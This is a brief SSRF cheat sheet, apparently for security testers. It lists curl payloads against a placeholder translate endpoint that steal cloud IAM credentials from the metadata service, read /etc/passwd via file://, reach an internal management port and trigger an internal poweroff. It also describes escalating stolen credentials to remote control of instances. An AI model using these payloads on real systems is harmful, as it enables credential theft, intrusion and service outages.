# SSRF

## Table of Contents

- [Access Control Bypass](#access-control-bypass)
- [Denial of Service](#denial-of-service)
- [RCE](#rce)

## Access Control Bypass

### Access controls implemented in the service can be bypassed, leading to data leakage.

- Retrieve security credentials from instance metadata [^1]
    ```bash
    curl https://[VULNERABLE-SERVICE]/translate?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
    ```

- Read arbitrary files from the file system
    ```bash
    curl https://[VULNERABLE-SERVICE]/translate?url=file:///etc/passwd
    ```

- Access to the internal network
    ```bash
    curl https://[VULNERABLE-SERVICE]/translate?url=http://127.0.0.1:8888/management
    ```

## Denial of Service

### It is possible to interact with internal services, causing service interruptions.

- Calling a management endpoint of an internal service
    ```bash
    curl https://[VULNERABLE-SERVICE]/translate?url=http://127.0.0.1:8888/poweroff
    ```

## RCE

### Credentials obtained from internal endpoints can give control over the infrastructure that runs the service.

- Escalating from the metadata service to the instances
    - The metadata service exposes credentials and bootstrap configuration for the instance, as in the [Access Control Bypass](#access-control-bypass) case. Used outside the server, they can grant access to the cloud account or the cluster that runs the service, where commands can be run on its instances.
    - HackerOne report, [SSRF in Exchange leads to ROOT access in all instances](https://hackerone.com/reports/341876)

[^1]: Based on IMDSv1 (AWS).
